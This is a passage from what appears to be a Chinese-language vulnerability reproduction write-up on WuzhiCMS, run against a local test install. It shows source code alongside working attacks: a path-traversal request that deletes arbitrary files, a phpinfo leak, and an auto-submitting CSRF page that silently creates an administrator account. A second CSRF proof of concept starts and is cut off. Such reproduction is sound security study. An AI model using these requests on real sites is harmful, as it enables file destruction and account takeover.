#61AFEF"> </span><span style="color: #98C379">&#39;&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E06C75">$val</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">$val</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">addslashes</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$val</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$val</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure></li><li><p>寻找id参数，传入$path(还是在del的定义中)</p><figure class="shiki php"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #E06C75">$id</span><span style="color: #ABB2BF">) {</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF">(</span><span style="color: #56B6C2">!is_array</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$id</span><span style="color: #ABB2BF">)) {</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">$ids</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">array</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$id</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">} </span><span style="color: #C678DD">else</span><span style="color: #ABB2BF"> {</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">$ids</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$id</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">}</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">foreach</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$ids</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">as</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$id</span><span style="color: #ABB2BF">) {</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">$where</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">array</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;id&#39;</span><span style="color: #ABB2BF"> =&gt; </span><span style="color: #E06C75">$id</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">$att_info</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">db</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #61AFEF">get_one</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;attachment&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">$where</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;usertimes,path&#39;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #E06C75">$att_info</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;usertimes&#39;</span><span style="color: #ABB2BF">] </span><span style="color: #56B6C2">&gt;</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">) {</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">db</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #61AFEF">update</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;attachment&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;usertimes = usertimes-1&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">$where</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">}</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">else</span><span style="color: #ABB2BF"> {</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #61AFEF">my_unlink</span><span style="color: #ABB2BF">(ATTACHMENT_ROOT </span><span style="color: #ABB2BF">.</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$att_info</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;path&#39;</span><span style="color: #ABB2BF">]);</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">db</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #61AFEF">delete</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;attachment&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">$where</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">db</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #61AFEF">delete</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;attachment_tag_index&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #56B6C2">array</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;att_id&#39;</span><span style="color: #ABB2BF">=&gt;</span><span style="color: #E06C75">$id</span><span style="color: #ABB2BF">));</span></span><span class="line"><span style="color: #ABB2BF">}</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><p>如果取id，则传入$path需要数据库</p><p>如果不传入id参数，判断我们传入的 path 是否在数据库中，如果不在就会对我们传入的 $path 进行删除。</p></li><li><p>删除测试文件(根目录下   text.txt)，抓包（删除其他文件）</p><figure class="shiki shell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">index.php?v</span><span style="color: #ABB2BF">=del&amp;</span><span style="color: #E06C75">url</span><span style="color: #56B6C2">=</span><span style="color: #98C379">../text.txt</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">m</span><span style="color: #56B6C2">=</span><span style="color: #98C379">attachment</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">f</span><span style="color: #56B6C2">=</span><span style="color: #98C379">index</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">_su</span><span style="color: #56B6C2">=</span><span style="color: #98C379">wuzhicms</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">_menuid</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">29</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">_submenuid</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">52</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">HTTP/1.1</span></span></code></pre></div></div></figure></li></ol><h2 id="复现5（信息泄露）"><a href="#复现5（信息泄露）" class="headerlink" title="复现5（信息泄露）"></a>复现5（信息泄露）</h2><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027192541870.png" alt="image-20250719015335393"></p><p>在后台页面发现一出phpinfo</p><h2 id="复现6（csrf）"><a href="#复现6（csrf）" class="headerlink" title="复现6（csrf）"></a>复现6（csrf）</h2><p> 系统设置 &#x3D;&gt; 权限管理 &#x3D;&gt; 添加管理员</p><p>修改权限时提交抓包，显示路径</p><p>路径：&#x2F;index.php?m&#x3D;core&amp;f&#x3D;power&amp;v&#x3D;add&amp;&amp;_su&#x3D;wuzhicms</p><ol><li><p>根据路径寻找代码</p><p>coreframe\app\core\admin\power.php</p><figure class="shiki php"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">/**</span></span><span class="line"><span style="color: #7F848E; font-style: italic"> * 添加管理员</span></span><span class="line"><span style="color: #7F848E; font-style: italic"> */</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">public</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">function</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">add</span><span style="color: #ABB2BF">() {</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">if</span><span style="color: #ABB2BF">(</span><span style="color: #56B6C2">isset</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$GLOBALS</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;submit&#39;</span><span style="color: #ABB2BF">])) {</span></span><span class="line"><span style="color: #ABB2BF">            </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF">(</span><span style="color: #56B6C2">empty</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$GLOBALS</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;form&#39;</span><span style="color: #ABB2BF">][</span><span style="color: #98C379">&#39;username&#39;</span><span style="color: #ABB2BF">])) </span><span style="color: #61AFEF">MSG</span><span style="color: #ABB2BF">(</span><span style="color: #61AFEF">L</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;parameter error&#39;</span><span style="color: #ABB2BF">));</span></span><span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E06C75">$username</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$GLOBALS</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;form&#39;</span><span style="color: #ABB2BF">][</span><span style="color: #98C379">&#39;username&#39;</span><span style="color: #ABB2BF">];</span></span><span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E06C75">$r</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">db</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #61AFEF">get_one</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;member&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #56B6C2">array</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;username&#39;</span><span style="color: #ABB2BF">=&gt;</span><span style="color: #E06C75">$username</span><span style="color: #ABB2BF">));</span></span><span class="line"><span style="color: #ABB2BF">            </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF">(</span><span style="color: #56B6C2">!</span><span style="color: #E06C75">$r</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;uid&#39;</span><span style="color: #ABB2BF">]) </span><span style="color: #61AFEF">MSG</span><span style="color: #ABB2BF">(</span><span style="color: #61AFEF">L</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;账号不存在，请先管理会员处－添加账号&#39;</span><span style="color: #ABB2BF">));</span></span><span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E06C75">$rs</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">db</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #61AFEF">get_one</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;admin&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #56B6C2">array</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;uid&#39;</span><span style="color: #ABB2BF">=&gt;</span><span style="color: #E06C75">$r</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;uid&#39;</span><span style="color: #ABB2BF">]));</span></span><span class="line"><span style="color: #ABB2BF">            </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$rs</span><span style="color: #ABB2BF">) </span><span style="color: #61AFEF">MSG</span><span style="color: #ABB2BF">(</span><span style="color: #61AFEF">L</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;管理员已存在！&#39;</span><span style="color: #ABB2BF">));</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">$formdata</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">array</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">$formdata</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;uid&#39;</span><span style="color: #ABB2BF">] </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$r</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;uid&#39;</span><span style="color: #ABB2BF">];</span></span><span class="line"><span style="color: #ABB2BF">            </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF">(</span><span style="color: #56B6C2">empty</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$GLOBALS</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;form&#39;</span><span style="color: #ABB2BF">][</span><span style="color: #98C379">&#39;password&#39;</span><span style="color: #ABB2BF">])) {</span></span><span class="line"><span style="color: #ABB2BF">                </span><span style="color: #E06C75">$formdata</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;password&#39;</span><span style="color: #ABB2BF">] </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;&#39;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">            } </span><span style="color: #C678DD">else</span><span style="color: #ABB2BF"> {</span></span><span class="line"><span style="color: #ABB2BF">                </span><span style="color: #E06C75">$factor</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">substr</span><span style="color: #ABB2BF">(</span><span style="color: #61AFEF">random_string</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;md5&#39;</span><span style="color: #ABB2BF">),</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">,</span><span style="color: #D19A66">6</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">                </span><span style="color: #E06C75">$password</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">md5</span><span style="color: #ABB2BF">(</span><span style="color: #56B6C2">md5</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$GLOBALS</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;form&#39;</span><span style="color: #ABB2BF">][</span><span style="color: #98C379">&#39;password&#39;</span><span style="color: #ABB2BF">])</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">$factor</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">                </span><span style="color: #E06C75">$formdata</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;password&#39;</span><span style="color: #ABB2BF">] </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$password</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">                </span><span style="color: #E06C75">$formdata</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;factor&#39;</span><span style="color: #ABB2BF">] </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$factor</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">            }</span></span><span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E06C75">$formdata</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;role&#39;</span><span style="color: #ABB2BF">] </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;,&#39;</span><span style="color: #ABB2BF">.</span><span style="color: #56B6C2">implode</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;,&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75">$GLOBALS</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;form&#39;</span><span style="color: #ABB2BF">][</span><span style="color: #98C379">&#39;role&#39;</span><span style="color: #ABB2BF">])</span><span style="color: #ABB2BF">.</span><span style="color: #98C379">&#39;,&#39;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E06C75">$formdata</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;truename&#39;</span><span style="color: #ABB2BF">] </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">remove_xss</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$GLOBALS</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;form&#39;</span><span style="color: #ABB2BF">][</span><span style="color: #98C379">&#39;truename&#39;</span><span style="color: #ABB2BF">]);</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">db</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #61AFEF">insert</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;admin&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75">$formdata</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #61AFEF">MSG</span><span style="color: #ABB2BF">(</span><span style="color: #61AFEF">L</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;operation success&#39;</span><span style="color: #ABB2BF">));</span></span><span class="line"><span style="color: #ABB2BF">} </span><span style="color: #C678DD">else</span><span style="color: #ABB2BF"> {</span></span><span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E06C75">$show_formjs</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">$form</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">load_class</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;form&#39;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E06C75">$roles</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">db</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #61AFEF">get_list</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;admin_role&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;*&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">100</span><span style="color: #ABB2BF">);</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">include</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #61AFEF">template</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;power_add&#39;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">}</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><p>add函数用于添加管理员</p><p>是否点击提交操作——–判断用户名是否为空（不为空则将username值赋值给 $username ）——–从数据库中取出前台账户（不存在则添加会员）——是否已经是管理员（并且判断是否设置密码）———最后将修改内容添加到数据库中</p></li><li><p>通过抓包构造html</p><p>右击转到request，右击转到Engage tools → Generate CSRF PoC</p><figure class="shiki html"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">html</span><span style="color: #ABB2BF">&gt;&lt;</span><span style="color: #E06C75">body</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">    &lt;</span><span style="color: #E06C75">script</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">type</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;text/javascript&quot;</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">function</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">post</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75; font-style: italic">url</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75; font-style: italic">fields</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #ABB2BF">    {</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">var</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">p</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">document</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">createElement</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;form&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E5C07B">p</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">action</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">url</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E5C07B">p</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">innerHTML</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">fields</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E5C07B">p</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">target</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;_self&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E5C07B">p</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">method</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;post&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E5C07B">document</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">body</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">appendChild</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">p</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E5C07B">p</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">submit</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">function</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">csrf_hack</span><span style="color: #ABB2BF">()</span></span><span class="line"><span style="color: #ABB2BF">    {</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">var</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">fields</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">fields</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;&lt;input type=&#39;hidden&#39; name=&#39;form[role][]&#39; value=&#39;1&#39; /&gt;&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">fields</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;&lt;input type=&#39;hidden&#39; name=&#39;form[username]&#39; value=&#39;hack123&#39; /&gt;&quot;</span><span style="color: #ABB2BF">; </span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">fields</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;&lt;input type=&#39;hidden&#39; name=&#39;form[password]&#39; value=&#39;&#39; /&gt;&quot;</span><span style="color: #ABB2BF">; </span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">fields</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;&lt;input type=&#39;hidden&#39; name=&#39;form[truename]&#39; value=&#39;taoge@5ecurity&#39; /&gt;&quot;</span><span style="color: #ABB2BF">; </span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">var</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">url</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;http://127.0.0.1/www/index.php?m=core&amp;f=power&amp;v=add&amp;&amp;_su=wuzhicms&amp;_menuid=61&amp;_submenuid=62&amp;submit=提交&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #61AFEF">post</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">url</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75">fields</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E5C07B">window</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">onload</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">function</span><span style="color: #ABB2BF">() { </span><span style="color: #61AFEF">csrf_hack</span><span style="color: #ABB2BF">();}</span></span><span class="line"><span style="color: #ABB2BF">    &lt;/</span><span style="color: #E06C75">script</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">    &lt;/</span><span style="color: #E06C75">body</span><span style="color: #ABB2BF">&gt;&lt;/</span><span style="color: #E06C75">html</span><span style="color: #ABB2BF">&gt;</span></span></code></pre></div></div></figure></li></ol><h2 id="复现7（csrf）"><a href="#复现7（csrf）" class="headerlink" title="复现7（csrf）"></a>复现7（csrf）</h2><p> 系统设置 &#x3D;&gt; 邮件服务器</p><p>（同上）</p><ol><li><p>通过抓包构造html，</p><p>右击转到request，右击转到Engage tools → Generate CSRF PoC</p><figure class="shiki html"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 